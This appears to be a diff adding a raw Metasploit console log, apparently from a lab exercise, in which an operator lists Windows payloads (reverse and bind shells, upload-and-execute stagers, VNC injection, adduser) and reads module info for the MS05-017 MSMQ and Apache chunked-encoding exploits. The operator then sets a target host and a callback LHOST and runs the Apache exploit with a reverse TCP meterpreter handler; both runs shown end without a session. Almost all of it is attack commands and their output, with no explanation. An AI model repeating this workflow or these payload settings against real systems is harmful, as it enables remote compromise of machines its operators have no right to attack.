+   163  payload/windows/shell/reverse_tcp_uuid                      .                normal  No     Windows Command Shell, Reverse TCP Stager with UUID Support
+   164  payload/windows/shell/reverse_udp                           .                normal  No     Windows Command Shell, Reverse UDP Stager with UUID Support
+   165  payload/windows/shell_bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Inline
+   166  payload/windows/shell_bind_tcp_xpfw                         .                normal  No     Windows Disable Windows ICF, Command Shell, Bind TCP Inline
+   167  payload/windows/shell_hidden_bind_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Inline
+   168  payload/windows/shell_reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Inline
+   169  payload/windows/speak_pwned                                 .                normal  No     Windows Speech API - Say "You Got Pwned!"
+   170  payload/windows/upexec/bind_hidden_ipknock_tcp              .                normal  No     Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
+   171  payload/windows/upexec/bind_hidden_tcp                      .                normal  No     Windows Upload/Execute, Hidden Bind TCP Stager
+   172  payload/windows/upexec/bind_ipv6_tcp                        .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
+   173  payload/windows/upexec/bind_ipv6_tcp_uuid                   .                normal  No     Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   174  payload/windows/upexec/bind_named_pipe                      .                normal  No     Windows Upload/Execute, Windows x86 Bind Named Pipe Stager
+   175  payload/windows/upexec/bind_nonx_tcp                        .                normal  No     Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
+   176  payload/windows/upexec/bind_tcp                             .                normal  No     Windows Upload/Execute, Bind TCP Stager (Windows x86)
+   177  payload/windows/upexec/bind_tcp_rc4                         .                normal  No     Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   178  payload/windows/upexec/bind_tcp_uuid                        .                normal  No     Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
+   179  payload/windows/upexec/reverse_ipv6_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (IPv6)
+   180  payload/windows/upexec/reverse_nonx_tcp                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
+   181  payload/windows/upexec/reverse_ord_tcp                      .                normal  No     Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
+   182  payload/windows/upexec/reverse_tcp                          .                normal  No     Windows Upload/Execute, Reverse TCP Stager
+   183  payload/windows/upexec/reverse_tcp_allports                 .                normal  No     Windows Upload/Execute, Reverse All-Port TCP Stager
+   184  payload/windows/upexec/reverse_tcp_dns                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (DNS)
+   185  payload/windows/upexec/reverse_tcp_rc4                      .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   186  payload/windows/upexec/reverse_tcp_rc4_dns                  .                normal  No     Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   187  payload/windows/upexec/reverse_tcp_uuid                     .                normal  No     Windows Upload/Execute, Reverse TCP Stager with UUID Support
+   188  payload/windows/upexec/reverse_udp                          .                normal  No     Windows Upload/Execute, Reverse UDP Stager with UUID Support
+   189  payload/windows/vncinject/bind_hidden_ipknock_tcp           .                normal  No     VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   190  payload/windows/vncinject/bind_hidden_tcp                   .                normal  No     VNC Server (Reflective Injection), Hidden Bind TCP Stager
+   191  payload/windows/vncinject/bind_ipv6_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   192  payload/windows/vncinject/bind_ipv6_tcp_uuid                .                normal  No     VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   193  payload/windows/vncinject/bind_named_pipe                   .                normal  No     VNC Server (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   194  payload/windows/vncinject/bind_nonx_tcp                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   195  payload/windows/vncinject/bind_tcp                          .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
+   196  payload/windows/vncinject/bind_tcp_rc4                      .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   197  payload/windows/vncinject/bind_tcp_uuid                     .                normal  No     VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   198  payload/windows/vncinject/reverse_http                      .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   199  payload/windows/vncinject/reverse_http_proxy_pstore         .                normal  No     VNC Server (Reflective Injection), Reverse HTTP Stager Proxy
+   200  payload/windows/vncinject/reverse_ipv6_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
+   201  payload/windows/vncinject/reverse_nonx_tcp                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   202  payload/windows/vncinject/reverse_ord_tcp                   .                normal  No     VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   203  payload/windows/vncinject/reverse_tcp                       .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager
+   204  payload/windows/vncinject/reverse_tcp_allports              .                normal  No     VNC Server (Reflective Injection), Reverse All-Port TCP Stager
+   205  payload/windows/vncinject/reverse_tcp_dns                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
+   206  payload/windows/vncinject/reverse_tcp_rc4                   .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   207  payload/windows/vncinject/reverse_tcp_rc4_dns               .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   208  payload/windows/vncinject/reverse_tcp_uuid                  .                normal  No     VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
+   209  payload/windows/vncinject/reverse_winhttp                   .                normal  No     VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> set payload payload/windows/meterpreter/bind_tcp
+payload => windows/meterpreter/bind_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> info 
+
+       Name: MS05-017 Microsoft Message Queueing Service Path Overflow
+     Module: exploit/windows/dcerpc/ms05_017_msmq
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2005-04-12
+
+Provided by:
+  hdm <x@hdm.io>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Windows 2000 ALL / Windows XP SP0-SP1 (English)
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  HNAME                    yes       The NetBIOS hostname of the target
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   2103             yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+  Avoid: 8 characters
+
+Description:
+  This module exploits a stack buffer overflow in the RPC interface
+  to the Microsoft Message Queueing service. The offset to the
+  return address changes based on the length of the system
+  hostname, so this must be provided via the 'HNAME' option.
+  Much thanks to snort.org and Jean-Baptiste Marchand's
+  excellent MSRPC website.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2005-0059
+  OSVDB (15458)
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2005/MS05-017
+  http://www.securityfocus.com/bid/13112
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> set RHOST 10.129.1.11
+RHOST => 10.129.1.11
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> set LHOST 10.10.14.4
+[!] Unknown datastore option: LHOST. Did you mean RHOST?
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> info
+
+       Name: MS05-017 Microsoft Message Queueing Service Path Overflow
+     Module: exploit/windows/dcerpc/ms05_017_msmq
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2005-04-12
+
+Provided by:
+  hdm <x@hdm.io>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Windows 2000 ALL / Windows XP SP0-SP1 (English)
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  HNAME                    yes       The NetBIOS hostname of the target
+  RHOSTS  10.129.1.11      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   2103             yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+  Avoid: 8 characters
+
+Description:
+  This module exploits a stack buffer overflow in the RPC interface
+  to the Microsoft Message Queueing service. The offset to the
+  return address changes based on the length of the system
+  hostname, so this must be provided via the 'HNAME' option.
+  Much thanks to snort.org and Jean-Baptiste Marchand's
+  excellent MSRPC website.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2005-0059
+  OSVDB (15458)
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2005/MS05-017
+  http://www.securityfocus.com/bid/13112
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> run
+[-] 10.129.1.11:2103 - Msf::OptionValidateError One or more options failed to validate: HNAME.
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search httpd 2.0
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   exploit/windows/http/apache_chunked                          2002-06-19       good       Yes    Apache Win32 Chunked Encoding
+   1     \_ target: Windows Generic Bruteforce                      .                .          .      .
+   2     \_ target: Apache.org Build 1.3.9->1.3.19                  .                .          .      .
+   3     \_ target: Apache.org Build 1.3.22->1.3.24                 .                .          .      .
+   4     \_ target: Apache.org Build 1.3.19->1.3.24                 .                .          .      .
+   5     \_ target: Apache.org Build 1.3.22                         .                .          .      .
+   6     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows 2000)  .                .          .      .
+   7     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows NT)    .                .          .      .
+   8     \_ target: Windows 2003 English SP0                        .                .          .      .
+   9     \_ target: Windows 2000 English                            .                .          .      .
+   10    \_ target: Oracle 8.1.7 Apache 1.3.12                      .                .          .      .
+   11    \_ target: Oracle 9.1.0 Apache 1.3.12                      .                .          .      .
+   12    \_ target: Oracle 9.2.0 Apache 1.3.22                      .                .          .      .
+   13    \_ target: Debugging Target                                .                .          .      .
+   14  auxiliary/dos/http/monkey_headers                            2013-05-30       normal     No     Monkey HTTPD Header Parsing Denial of Service (DoS)
+   15  exploit/unix/webapp/jquery_file_upload                       2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
+   16    \_ target: PHP Dropper                                     .                .          .      .
+   17    \_ target: Linux Dropper                                   .                .          .      .
+
+
+Interact with a module by name or index. For example info 17, use 17 or use exploit/unix/webapp/jquery_file_upload
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search Microsoft Terminal Services
+[-] No results from search
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search Terminal Services
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  exploit/linux/misc/igel_command_injection       2021-02-25       excellent  Yes    IGEL OS Secure VNC/Terminal Command Injection RCE
+   1    \_ target: Secure Terminal Service            .                .          .      .
+   2    \_ target: Secure Shadow Service              .                .          .      .
+   3  exploit/linux/persistence/init_upstart          2006-08-24       excellent  Yes    Service Upstart Persistence
+   4  exploit/linux/http/trendmicro_websecurity_exec  2020-06-10       excellent  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/linux/http/trendmicro_websecurity_exec
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search HTTPAPI
+[-] No results from search
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search msrpc
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank  Check  Description
+   -  ----                                  ---------------  ----  -----  -----------
+   0  exploit/windows/dcerpc/ms05_017_msmq  2005-04-12       good  No     MS05-017 Microsoft Message Queueing Service Path Overflow
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/dcerpc/ms05_017_msmq
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> search httpd 2.0
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   exploit/windows/http/apache_chunked                          2002-06-19       good       Yes    Apache Win32 Chunked Encoding
+   1     \_ target: Windows Generic Bruteforce                      .                .          .      .
+   2     \_ target: Apache.org Build 1.3.9->1.3.19                  .                .          .      .
+   3     \_ target: Apache.org Build 1.3.22->1.3.24                 .                .          .      .
+   4     \_ target: Apache.org Build 1.3.19->1.3.24                 .                .          .      .
+   5     \_ target: Apache.org Build 1.3.22                         .                .          .      .
+   6     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows 2000)  .                .          .      .
+   7     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows NT)    .                .          .      .
+   8     \_ target: Windows 2003 English SP0                        .                .          .      .
+   9     \_ target: Windows 2000 English                            .                .          .      .
+   10    \_ target: Oracle 8.1.7 Apache 1.3.12                      .                .          .      .
+   11    \_ target: Oracle 9.1.0 Apache 1.3.12                      .                .          .      .
+   12    \_ target: Oracle 9.2.0 Apache 1.3.22                      .                .          .      .
+   13    \_ target: Debugging Target                                .                .          .      .
+   14  auxiliary/dos/http/monkey_headers                            2013-05-30       normal     No     Monkey HTTPD Header Parsing Denial of Service (DoS)
+   15  exploit/unix/webapp/jquery_file_upload                       2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
+   16    \_ target: PHP Dropper                                     .                .          .      .
+   17    \_ target: Linux Dropper                                   .                .          .      .
+
+
+Interact with a module by name or index. For example info 17, use 17 or use exploit/unix/webapp/jquery_file_upload
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> use 8
+[*] Additionally setting TARGET => Windows 2003 English SP0
+[*] Using configured payload windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info
+
+       Name: Apache Win32 Chunked Encoding
+     Module: exploit/windows/http/apache_chunked
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2002-06-19
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+      0   Windows Generic Bruteforce
+      1   Apache.org Build 1.3.9->1.3.19
+      2   Apache.org Build 1.3.22->1.3.24
+      3   Apache.org Build 1.3.19->1.3.24
+      4   Apache.org Build 1.3.22
+      5   Apache.org Build 1.3.17->1.3.24 (Windows 2000)
+      6   Apache.org Build 1.3.17->1.3.24 (Windows NT)
+  =>  7   Windows 2003 English SP0
+      8   Windows 2000 English
+      9   Oracle 8.1.7 Apache 1.3.12
+      10  Oracle 9.1.0 Apache 1.3.12
+      11  Oracle 9.2.0 Apache 1.3.22
+      12  Debugging Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT    80               yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 987
+  Avoid: 8 characters
+
+Description:
+  This module exploits the chunked transfer integer wrap
+  vulnerability in Apache version 1.2.x to 1.3.24. This
+  particular module has been tested with all versions of the
+  official Win32 build between 1.3.9 and 1.3.24. Additionally,
+  it should work against most co-branded and bundled versions
+  of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
+
+  You will need to use the Check() functionality to determine
+  the exact target version prior to launching the exploit. The
+  version of Apache bundled with Oracle 8.1.7 will not
+  automatically restart, so if you use the wrong target value,
+  the server will crash.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2002-0392
+  OSVDB (838)
+  http://www.securityfocus.com/bid/5033
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> set RHOST 10.129.1.11
+RHOST => 10.129.1.11
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/2 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/6 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/5 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/4 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/1 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/3 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/0 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/7 ]
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> show payload info
+[-] Invalid parameter "payload", use "show -h" for more information
+[-] Invalid module: info
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> show payload 
+[-] Invalid parameter "payload", use "show -h" for more information
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info
+
+       Name: Apache Win32 Chunked Encoding
+     Module: exploit/windows/http/apache_chunked
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2002-06-19
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+      0   Windows Generic Bruteforce
+      1   Apache.org Build 1.3.9->1.3.19
+      2   Apache.org Build 1.3.22->1.3.24
+      3   Apache.org Build 1.3.19->1.3.24
+      4   Apache.org Build 1.3.22
+      5   Apache.org Build 1.3.17->1.3.24 (Windows 2000)
+      6   Apache.org Build 1.3.17->1.3.24 (Windows NT)
+  =>  7   Windows 2003 English SP0
+      8   Windows 2000 English
+      9   Oracle 8.1.7 Apache 1.3.12
+      10  Oracle 9.1.0 Apache 1.3.12
+      11  Oracle 9.2.0 Apache 1.3.22
+      12  Debugging Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS   10.129.1.11      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT    80               yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 987
+  Avoid: 8 characters
+
+Description:
+  This module exploits the chunked transfer integer wrap
+  vulnerability in Apache version 1.2.x to 1.3.24. This
+  particular module has been tested with all versions of the
+  official Win32 build between 1.3.9 and 1.3.24. Additionally,
+  it should work against most co-branded and bundled versions
+  of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
+
+  You will need to use the Check() functionality to determine
+  the exact target version prior to launching the exploit. The
+  version of Apache bundled with Oracle 8.1.7 will not
+  automatically restart, so if you use the wrong target value,
+  the server will crash.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2002-0392
+  OSVDB (838)
+  http://www.securityfocus.com/bid/5033
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info -d
+[*] Generating documentation for apache_chunked, then opening /tmp/apache_chunked_doc20260527-320450-yjgvuw.html in a browser...
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> Gtk-Message: 19:06:05.835: Failed to load module "colorreload-gtk-module"
+[339761:339761:0527/190605.908663:ERROR:base/memory/shared_memory_switch.cc:289] Failed global descriptor lookup: 7
+[339676:339676:0527/190620.325555:ERROR:components/dbus/xdg/request.cc:169] Request ended (non-user cancelled).
+[340243:340243:0527/190620.405416:ERROR:base/memory/shared_memory_switch.cc:289] Failed global descriptor lookup: 7
+[339676:339744:0527/190623.033115:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: PHONE_REGISTRATION_ERROR
+[339676:339744:0527/190623.033551:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: PHONE_REGISTRATION_ERROR
+[339676:339744:0527/190623.034383:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: PHONE_REGISTRATION_ERROR
+[339676:339744:0527/190644.656722:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
+[339676:339744:0527/190743.476847:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
+Interrupt: use the 'exit' command to quit
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info
+
+       Name: Apache Win32 Chunked Encoding
+     Module: exploit/windows/http/apache_chunked
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2002-06-19
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+      0   Windows Generic Bruteforce
+      1   Apache.org Build 1.3.9->1.3.19
+      2   Apache.org Build 1.3.22->1.3.24
+      3   Apache.org Build 1.3.19->1.3.24
+      4   Apache.org Build 1.3.22
+      5   Apache.org Build 1.3.17->1.3.24 (Windows 2000)
+      6   Apache.org Build 1.3.17->1.3.24 (Windows NT)
+  =>  7   Windows 2003 English SP0
+      8   Windows 2000 English
+      9   Oracle 8.1.7 Apache 1.3.12
+      10  Oracle 9.1.0 Apache 1.3.12
+      11  Oracle 9.2.0 Apache 1.3.22
+      12  Debugging Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS   10.129.1.11      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT    80               yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 987
+  Avoid: 8 characters
+
+Description:
+  This module exploits the chunked transfer integer wrap
+  vulnerability in Apache version 1.2.x to 1.3.24. This
+  particular module has been tested with all versions of the
+  official Win32 build between 1.3.9 and 1.3.24. Additionally,
+  it should work against most co-branded and bundled versions
+  of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
+
+  You will need to use the Check() functionality to determine
+  the exact target version prior to launching the exploit. The
+  version of Apache bundled with Oracle 8.1.7 will not
+  automatically restart, so if you use the wrong target value,
+  the server will crash.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2002-0392
+  OSVDB (838)
+  http://www.securityfocus.com/bid/5033
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> set LPORT 4444
+LPORT => 4444
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/2 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/6 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/5 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/4 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/1 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/3 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/0 ]
+[*] Trying Windows 2003 English SP0 [ 0x7ffc0638/7 ]
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> set payload windows/
+Display all 203 possibilities? (y or n)
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> show payloads 
+
+Compatible Payloads
+===================
+
+   #    Name                                                        Disclosure Date  Rank    Check  Description
+   -    ----                                                        ---------------  ----    -----  -----------
+   0    payload/generic/custom                                      .                normal  No     Custom Payload
+   1    payload/generic/debug_trap                                  .                normal  No     Generic x86 Debug Trap
+   2    payload/generic/shell_bind_aws_ssm                          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3    payload/generic/shell_bind_tcp                              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4    payload/generic/shell_reverse_tcp                           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5    payload/generic/ssh/interact                                .                normal  No     Interact with Established SSH Connection
+   6    payload/generic/tight_loop                                  .                normal  No     Generic x86 Tight Loop
+   7    payload/windows/adduser                                     .                normal  No     Windows Execute net user /ADD
+   8    payload/windows/custom/bind_hidden_ipknock_tcp              .                normal  No     Windows shellcode stage, Hidden Bind Ipknock TCP Stager
+   9    payload/windows/custom/bind_hidden_tcp                      .                normal  No     Windows shellcode stage, Hidden Bind TCP Stager
+   10   payload/windows/custom/bind_ipv6_tcp                        .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager (Windows x86)
+   11   payload/windows/custom/bind_ipv6_tcp_uuid                   .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   12   payload/windows/custom/bind_named_pipe                      .                normal  No     Windows shellcode stage, Windows x86 Bind Named Pipe Stager
+   13   payload/windows/custom/bind_nonx_tcp                        .                normal  No     Windows shellcode stage, Bind TCP Stager (No NX or Win7)
+   14   payload/windows/custom/bind_tcp                             .                normal  No     Windows shellcode stage, Bind TCP Stager (Windows x86)
+   15   payload/windows/custom/bind_tcp_rc4                         .                normal  No     Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   16   payload/windows/custom/bind_tcp_uuid                        .                normal  No     Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x86)
+   17   payload/windows/custom/reverse_http                         .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (wininet)
+   18   payload/windows/custom/reverse_http_proxy_pstore            .                normal  No     Windows shellcode stage, Reverse HTTP Stager Proxy
+   19   payload/windows/custom/reverse_https                        .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (wininet)
+   20   payload/windows/custom/reverse_ipv6_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (IPv6)
+   21   payload/windows/custom/reverse_named_pipe                   .                normal  No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   22   payload/windows/custom/reverse_nonx_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (No NX or Win7)
+   23   payload/windows/custom/reverse_ord_tcp                      .                normal  No     Windows shellcode stage, Reverse Ordinal TCP Stager (No NX or Win7)
+   24   payload/windows/custom/reverse_tcp                          .                normal  No     Windows shellcode stage, Reverse TCP Stager
+   25   payload/windows/custom/reverse_tcp_allports                 .                normal  No     Windows shellcode stage, Reverse All-Port TCP Stager
+   26   payload/windows/custom/reverse_tcp_dns                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (DNS)
+   27   payload/windows/custom/reverse_tcp_rc4                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   28   payload/windows/custom/reverse_tcp_rc4_dns                  .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   29   payload/windows/custom/reverse_tcp_uuid                     .                normal  No     Windows shellcode stage, Reverse TCP Stager with UUID Support
+   30   payload/windows/custom/reverse_udp                          .                normal  No     Windows shellcode stage, Reverse UDP Stager with UUID Support
+   31   payload/windows/custom/reverse_winhttp                      .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (winhttp)
+   32   payload/windows/custom/reverse_winhttps                     .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (winhttp)
